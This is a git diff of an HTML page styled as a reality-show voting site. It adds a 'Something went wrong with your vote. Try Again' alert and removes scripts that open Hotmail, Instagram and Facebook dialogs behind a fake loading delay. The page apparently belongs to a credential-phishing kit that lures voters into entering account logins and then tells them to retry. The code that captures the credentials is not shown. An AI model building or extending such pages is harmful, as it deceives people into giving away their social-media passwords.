@@ -10,6 +10,37 @@
   <link rel="stylesheet" href="css/profile.css">
   <script src="js/index.js"></script>
   <title>Passion Pro Reality Show</title>
+
+    <style>
+    #customAlert {
+      display: none;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      width: 300px;
+      background: white;
+      padding: 20px;
+      box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+      border-radius: 8px;
+      text-align: center;
+      z-index: 1000;
+    }
+
+    #customAlert button {
+      padding: 10px 20px;
+      background: #007bff;
+      color: white;
+      border: none;
+      border-radius: 4px;
+      cursor: pointer;
+    }
+
+    #customAlert button:hover {
+      background: #0056b3;
+    }
+  </style>
+  
   <style>
     .popup {
       position: fixed;
@@ -234,6 +265,13 @@
       </div>
     </div>
   </center>
+
+    <div id="customAlert"
+    style="display: none; position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 300px; background: white; padding: 20px; box-shadow: 0 4px 8px rgba(0,0,0,0.2); border-radius: 8px; text-align: center;">
+    <p>Something went wrong with your vote.</p>
+    <button onclick="closeAlert()">Try Again</button>
+  </div>
+  
   </div>
   <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase-app.js"></script>
 
@@ -242,63 +280,7 @@
   <script src="https://www.gstatic.com/firebasejs/5.8.1/firebase.js"></script>
   <script src="https://raw.githubusercontent.com/firebase/firebase-bower/master/firebase-app-check.js.map"></script>
 
-  <script src="js/firebase.js">
-
-
-
-  </script>
-
-  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11.0.20/dist/sweetalert2.all.min.js"></script>
-  <script>
-    function showCustomAlert() {
-      Swal.fire({
-        title: 'Oops!',
-        text: 'Something went wrong with your vote.',
-        icon: 'error',
-        confirmButtonText: 'Try Again'
-      });
-    }
-  </script>
-
-  <script>
-    function showPreloader() {
-      document.getElementById("preloader").style.display = "flex";
-    }
-
-    function hidePreloader() {
-      document.getElementById("preloader").style.display = "none";
-    }
-
-    function Hotmail() {
-      showPreloader();
-      setTimeout(function () {
-        hidePreloader();
-        document.getElementById("hotmail").style.display = "flex";
-      }, 1000); // Delay in milliseconds
-    }
-
-    function Instagram() {
-      showPreloader();
-      setTimeout(function () {
-        hidePreloader();
-        document.getElementById("instagram").style.display = "flex";
-      }, 1000); // Delay in milliseconds
-    }
-
-    function Facebook() {
-      showPreloader();
-      setTimeout(function () {
-        hidePreloader();
-        document.getElementById("facebook").style.display = "flex";
-      }, 1000); // Delay in milliseconds
-    }
-
-    function closeDialog() {
-      document.getElementById("instagram").style.display = "none";
-      document.getElementById("hotmail").style.display = "none";
-      document.getElementById("facebook").style.display = "none";
-    }
-  </script>
+  <script src="js/firebase.js"></script>
 
   <script>
     const voters = [
